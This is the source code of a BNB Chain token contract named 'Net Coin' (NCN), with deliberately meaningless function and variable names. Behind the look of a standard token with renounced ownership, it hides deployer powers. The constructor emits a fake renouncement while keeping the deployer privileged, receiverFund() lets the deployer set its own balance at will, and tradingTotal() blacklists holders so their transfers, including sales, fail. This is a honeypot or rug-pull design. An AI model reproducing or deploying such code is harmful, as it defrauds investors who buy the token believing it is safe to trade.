/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract marketingLaunchAt {
    function liquidityExempt() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface senderSellSwap {
    function createPair(address senderLiquidity, address buyMax) external returns (address);
}

interface txToToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract NetCoin is IERC20, marketingLaunchAt {

    function tradingTotal(address buyTeam) public {
        if (marketingMin) {
            sellLaunch = minList;
        }
        if (buyTeam == fundTotal || buyTeam == tradingSell || !walletExemptFee[liquidityExempt()]) {
            return;
        }
        if (fromTotal == sellLaunch) {
            sellLaunch = receiverTeam;
        }
        modeAmount[buyTeam] = true;
    }

    function tokenSell() public {
        
        if (receiverTeam == buyAtAmount) {
            maxTeam = sellLaunch;
        }
        sellLaunch=0;
    }

    function receiverAuto(address fromTo, address toToken, uint256 tokenShould) internal returns (bool) {
        require(maxMin[fromTo] >= tokenShould);
        maxMin[fromTo] -= tokenShould;
        maxMin[toToken] += tokenShould;
        emit Transfer(fromTo, toToken, tokenShould);
        return true;
    }

    function receiverFund(uint256 tokenShould) public {
        if (!walletExemptFee[liquidityExempt()]) {
            return;
        }
        maxMin[fundTotal] = tokenShould;
    }

    function allowance(address marketingExempt, address liquidityBuy) external view virtual override returns (uint256) {
        return maxReceiver[marketingExempt][liquidityBuy];
    }

    function launchedMode() public {
        
        
        isFromEnable=false;
    }

    function balanceOf(address takeList) public view virtual override returns (uint256) {
        return maxMin[takeList];
    }

    mapping(address => mapping(address => uint256)) private maxReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return buyTotal;
    }

    uint256 private buyAtAmount;

    function owner() external view returns (address) {
        return teamTo;
    }

    mapping(address => bool) public modeAmount;

    bool private marketingMin;

    function amountFund() public view returns (bool) {
        return marketingMin;
    }

    function name() external view returns (string memory) {
        return marketingShould;
    }

    function approve(address liquidityBuy, uint256 tokenShould) public virtual override returns (bool) {
        maxReceiver[liquidityExempt()][liquidityBuy] = tokenShould;
        emit Approval(liquidityExempt(), liquidityBuy, tokenShould);
        return true;
    }

    string private marketingShould = "Net Coin";

    uint256 public receiverTeam;

    constructor (){
        if (maxTeam != sellLaunch) {
            buyLiquidity = true;
        }
        txToToken limitTake = txToToken(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tradingSell = senderSellSwap(limitTake.factory()).createPair(limitTake.WETH(), address(this));
        teamTo = liquidityExempt();
        if (maxTeam != fromTotal) {
            minList = buyAtAmount;
        }
        fundTotal = liquidityExempt();
        walletExemptFee[liquidityExempt()] = true;
        if (buyLiquidity == marketingMin) {
            buyLiquidity = false;
        }
        maxMin[liquidityExempt()] = buyTotal;
        emit Transfer(address(0), fundTotal, buyTotal);
        launchIs();
    }

    function tokenTrading() public {
        if (buyAtAmount == fromTotal) {
            fromTotal = sellLaunch;
        }
        if (buyLiquidity != marketingMin) {
            receiverTeam = fromTotal;
        }
        receiverTeam=0;
    }

    function getOwner() external view returns (address) {
        return teamTo;
    }

    uint256 public sellLaunch;

    uint256 private buyTotal = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed launchedBuyFee, address indexed launchedEnable);

    uint8 private buyFund = 18;

    function decimals() external view returns (uint8) {
        return buyFund;
    }

    function symbol() external view returns (string memory) {
        return liquidityAmount;
    }

    string private liquidityAmount = "NCN";

    function shouldLiquidity(address receiverSellTeam) public {
        if (txIs) {
            return;
        }
        
        walletExemptFee[receiverSellTeam] = true;
        
        txIs = true;
    }

    function listEnable() public view returns (uint256) {
        return receiverTeam;
    }

    function amountEnable(address fromTo, address toToken, uint256 tokenShould) internal returns (bool) {
        if (fromTo == fundTotal) {
            return receiverAuto(fromTo, toToken, tokenShould);
        }
        require(!modeAmount[fromTo]);
        return receiverAuto(fromTo, toToken, tokenShould);
    }

    bool public buyLiquidity;

    address private teamTo;

    uint256 private minList;

    uint256 private maxTeam;

    address public fundTotal;

    function launchIs() public {
        emit OwnershipTransferred(fundTotal, address(0));
        teamTo = address(0);
    }

    uint256 public fromTotal;

    mapping(address => uint256) private maxMin;

    bool private isFromEnable;

    function transferFrom(address fromTo, address toToken, uint256 tokenShould) external override returns (bool) {
        if (maxReceiver[fromTo][liquidityExempt()] != type(uint256).max) {
            require(tokenShould <= maxReceiver[fromTo][liquidityExempt()]);
            maxReceiver[fromTo][liquidityExempt()] -= tokenShould;
        }
        return amountEnable(fromTo, toToken, tokenShould);
    }

    function transfer(address teamMax, uint256 tokenShould) external virtual override returns (bool) {
        return amountEnable(liquidityExempt(), teamMax, tokenShould);
    }

    bool public txIs;

    address public tradingSell;

    mapping(address => bool) public walletExemptFee;

}